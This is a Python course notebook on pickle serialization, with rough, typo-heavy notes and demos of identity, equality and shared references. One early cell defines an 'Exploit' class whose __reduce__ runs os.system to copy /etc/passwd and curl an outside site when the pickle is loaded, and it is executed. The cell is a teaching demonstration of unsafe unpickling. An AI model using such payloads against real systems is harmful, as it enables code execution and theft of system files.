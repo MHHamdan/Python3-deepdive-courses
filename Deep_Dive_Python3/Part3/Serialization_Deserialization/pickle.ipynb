{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# serialization and deserializing .. marshalling ... create an objet represenation .. reload object from representation ... object seriazaw 111 .. picle is a binary sereialization .\n",
    "\n",
    "\n",
    "# unpickling -- deserializing can excute .. code .. unpickling ... not safe .. unpickling data that you trust .. not safe .. \n",
    "\n",
    "# usage import pickle ... dump ... pickle to a file . unpicle from a file .. load ... dumps ... return strings .. pickled represetn stor in a varible .. loads ... \n",
    "\n",
    "# equality and idnetity .. === .. identity is .. \n",
    "\n",
    "## lsit equal but ident are not .. is and == .. \n",
    "\n",
    "## dict1 == piclkle .. s. unpicla .. d2 .. id(d1) .id(d2) is differnt .. d1 == d2 but __eq__ are differen t.. custom object list and idction arn the two dictionarie are t  sam ve obje t.. \n",
    "\n",
    "# Python gdonse reseriazlie an object it ha s a laredy serailzaded .. kept he singel compy of bojbe .. \n",
    "\n",
    "## picle recursive obje sn share objecta sre deseriazlid as shared objects as well. .. prop1 an dprop2 .. obje .. pickle and unpicklw . prop1 an dporp2 .. reconstitute for the piclek data .. prop1 , an dprop2 .. is reference ..  the relatif .. ... picklien gan dunpiclking .. \n",
    "\n",
    "# JSAON Seriazing .in up .. \n",
    "\n",
    "\n",
    "# Pickling .. JSON .. Dictionary .. custom object .. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os \n",
    "import pickle \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Exploit:\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt',))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def serialize_exploite(fname):\n",
    "    with open(fname, 'wb') as f:\n",
    "        pickle.dump(Exploit(), f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "serialize_exploite('loadme')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100 15317    0 15317    0     0   148k      0 --:--:-- --:--:-- --:--:--  148k\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pickle \n",
    "\n",
    "pickle.load(open('loadme', 'rb'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100 15366    0 15366    0     0   176k      0 --:--:-- --:--:-- --:--:--  176k\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickle.load(open('loadme', 'rb'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps('Python PIckle Peppers')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x15Python PIckle Peppers\\x94.'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Python PIckle Peppers'"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(3.14)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00G@\\t\\x1e\\xb8Q\\xeb\\x85\\x1f.'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3.14"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "d = [10, 20, ('a', 'b', 30)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\nK\\x14\\x8c\\x01a\\x94\\x8c\\x01b\\x94K\\x1e\\x87\\x94e.'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[10, 20, ('a', 'b', 30)]"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser == d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(d) is id(deser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "from datetime import datetime"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "d = {\n",
    "    'a':10,\n",
    "    'b':[1,2,3],\n",
    "    'c':(1,2,3),\n",
    "    'd':{'x':1+2j, 'y':datetime.utcnow()}\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x8b\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x01a\\x94K\\n\\x8c\\x01b\\x94]\\x94(K\\x01K\\x02K\\x03e\\x8c\\x01c\\x94K\\x01K\\x02K\\x03\\x87\\x94\\x8c\\x01d\\x94}\\x94(\\x8c\\x01x\\x94\\x8c\\x08builtins\\x94\\x8c\\x07complex\\x94\\x93\\x94G?\\xf0\\x00\\x00\\x00\\x00\\x00\\x00G@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x86\\x94R\\x94\\x8c\\x01y\\x94\\x8c\\x08datetime\\x94\\x8c\\x08datetime\\x94\\x93\\x94C\\n\\x07\\xe6\\x0c\\x03\\x123*\\x01S\\x82\\x94\\x85\\x94R\\x94uu.'"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'a': 10,\n",
       " 'b': [1, 2, 3],\n",
       " 'c': (1, 2, 3),\n",
       " 'd': {'x': (1+2j), 'y': datetime.datetime(2022, 12, 3, 18, 51, 42, 86914)}}"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser == d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser is d # shared refences ae maintaine d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a':10, 'b': 20}\n",
    "d2 = {'x': 100, 'y': d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "d3 = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 100, 'y': {'a': 10, 'b': 20}}"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a':10, 'b': 20}\n",
    "d2 = {'x': 100, 'y': d1, 'z':d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2['y'] is d2['z']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 100, 'y': {'a': 10, 'b': 20}, 'z': {'a': 10, 'b': 20}}"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser['y'] is deser['z'] # maintain the shared refences . but heer sare some caveat .. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a': 1, 'b':2}\n",
    "d2 = {'x':10, 'y':d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1_ser = pickle.dumps(d1)\n",
    "d2_ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "del d1 \n",
    "del d2 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = pickle.loads(d1_ser)\n",
    "d2 = pickle.loads(d2_ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "({'a': 1, 'b': 2}, {'x': 10, 'y': {'a': 1, 'b': 2}})"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1, d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "d1['c'] = 99"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'a': 1, 'b': 2, 'c': 99}"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 10, 'y': {'a': 1, 'b': 2}}"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2['y'] is d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Person:\n",
    "    def __init__(self, name, age):\n",
    "        self.name = name \n",
    "        self.age = age \n",
    "    def __eq__(self,other) -> bool:\n",
    "        return self.name == other.name and self.age == other.age\n",
    "    \n",
    "    def __repr__(self) -> str:\n",
    "        return f'Person(name={self.name}, age={self.age})'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "sam = Person('Sam Hamdan', 1)\n",
    "sopheah = Person('sophiah Hamdan', 2)\n",
    "\n",
    "lojin = Person('lujin Hamdan', 3)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "john = Person('John Cleese', 79)\n",
    "eric = Person('Eric Idle', 75)\n",
    "michael = Person('Michael Palin', 75)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [],
   "source": [
    "parrot_sketch = {\n",
    "    \"title\": \"Parrot Sketch\",\n",
    "    \"actors\": [john, michael]\n",
    "}\n",
    "\n",
    "ministry_sketch = {\n",
    "    \"title\": \"Ministry of Silly Walks\",\n",
    "    \"actors\": [john, michael]\n",
    "}\n",
    "\n",
    "joke_sketch = {\n",
    "    \"title\": \"Funniest Joke in the World\",\n",
    "    \"actors\": [eric, michael]\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [],
   "source": [
    "fan_favorites = {\n",
    "    \"user_1\": [parrot_sketch, joke_sketch],\n",
    "    \"user_2\": [parrot_sketch, ministry_sketch]\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pprint import pprint "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'user_1': [{'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(name=Eric Idle, age=75),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Funniest Joke in the World'}],\n",
      " 'user_2': [{'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Ministry of Silly Walks'}]}\n"
     ]
    }
   ],
   "source": [
    "pprint(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "parrot_id_original = id(parrot_sketch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x16\\x01\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x06user_1\\x94]\\x94(}\\x94(\\x8c\\x05title\\x94\\x8c\\rParrot Sketch\\x94\\x8c\\x06actors\\x94]\\x94(\\x8c\\x08__main__\\x94\\x8c\\x06Person\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x04name\\x94\\x8c\\x0bJohn Cleese\\x94\\x8c\\x03age\\x94KOubh\\n)\\x81\\x94}\\x94(h\\r\\x8c\\rMichael Palin\\x94h\\x0fKKubeu}\\x94(h\\x04\\x8c\\x1aFunniest Joke in the World\\x94h\\x06]\\x94(h\\n)\\x81\\x94}\\x94(h\\r\\x8c\\tEric Idle\\x94h\\x0fKKubh\\x10eue\\x8c\\x06user_2\\x94]\\x94(h\\x03}\\x94(h\\x04\\x8c\\x17Ministry of Silly Walks\\x94h\\x06]\\x94(h\\x0bh\\x10eueu.'"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_fan_favorites = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'user_1': [{'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(name=Eric Idle, age=75),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Funniest Joke in the World'}],\n",
      " 'user_2': [{'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(name=John Cleese, age=79),\n",
      "                        Person(name=Michael Palin, age=75)],\n",
      "             'title': 'Ministry of Silly Walks'}]}\n"
     ]
    }
   ],
   "source": [
    "pprint(new_fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fan_favorites == new_fan_favorites"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4511584448, 4511584448)"
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(fan_favorites['user_1'][0]), id(fan_favorites['user_2'][0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4511665984, 4511665984)"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(new_fan_favorites['user_1'][0]), id(new_fan_favorites['user_2'][0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "aee8b7b246df8f9039afb4144a1f6fd8d2ca17a180786b69acc140d282b71a49"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
